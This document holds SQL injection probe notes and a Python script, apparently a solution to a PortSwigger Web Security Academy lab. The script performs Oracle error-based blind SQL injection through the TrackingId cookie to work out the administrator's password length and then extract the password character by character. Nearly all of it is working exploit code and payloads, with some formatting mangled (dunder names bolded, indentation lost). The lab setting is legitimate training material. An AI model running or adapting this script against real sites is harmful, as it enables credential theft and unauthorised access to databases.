```bash
TrackingId: 'order by 1 #; // 500 error

TrackingId: 'order by 1 --; // 200

TrackingId: ' order by 1,2 --; // 500

TrackingId: ' and 1=1 --; // true

TrackingId: and true --; // false



#!/usr/bin/env python3

from **future** import annotations

import requests
from typing import Optional

URL: str = "https://0ad1007504d3bfba80d7120e00dd009c.web-security-academy.net/"

TRACKING_ID_BASE: str = "4t85MkXoIyQ4drNe"
SESSION_ID: str = "xmHLz637cX9Ik7uvQrf30KWNA1edKaUm"

CHARACTERS: str = "abcdefghijklmnopqrstuvwxyz0123456789"

TIMEOUT: int = 5
PASSWORD_MAX_LENGTH: int = 50

HEADERS = {"User-Agent": "Mozilla/5.0"}

session = requests.Session()

def is_url_reachable() -> bool:
try:
r = session.get(URL, timeout=TIMEOUT, headers=HEADERS)
return r.status_code == 200
except requests.RequestException as exc:
print(f"[!] URL error: {exc}")
return False

def send_payload(payload: str) -> bool:
"""
Returns True if SQL error occurs (HTTP 500),
False otherwise.
"""
cookies = {
"TrackingId": f"{TRACKING_ID_BASE}{payload}",
"session": SESSION_ID,
}

    r = session.get(
        URL,
        cookies=cookies,
        headers=HEADERS,
        timeout=TIMEOUT,
    )

    return r.status_code == 500

def get_password_length() -> Optional[int]:
print("[*] Determining password length...")

    for length in range(1, PASSWORD_MAX_LENGTH + 1):
        payload = (
            "'||(SELECT CASE WHEN "
            f"(LENGTH(password)>{length}) "
            "THEN TO_CHAR(1/0) ELSE '' END "
            "FROM users WHERE username='administrator')||'"
        )

        if not send_payload(payload):
            print(f"[+] Password length: {length}")
            return length

    return None

def extract_password(length: int) -> Optional[str]:
print("[*] Extracting password...")
password = ""

    for pos in range(1, length + 1):
        for char in CHARACTERS:
            payload = (
                "'||(SELECT CASE WHEN "
                f"(SUBSTR(password,{pos},1)='{char}') "
                "THEN TO_CHAR(1/0) ELSE '' END "
                "FROM users WHERE username='administrator')||'"
            )

            if send_payload(payload):
                password += char
                print(f"[+] {pos}/{length}: {password}")
                break
        else:
            print(f"[-] Failed at position {pos}")
            return None

    return password

def main() -> None:
if not is_url_reachable():
print("[-] Target not reachable")
return

    print("[+] Target reachable — Oracle error-based SQLi confirmed")

    length = get_password_length()
    if length is None:
        print("[-] Could not determine password length")
        return

    password = extract_password(length)
    if password:
        print(f"\n[✔] Administrator password: {password}")
    else:
        print("\n[-] Extraction failed")

if **name** == "**main**":
main()

```
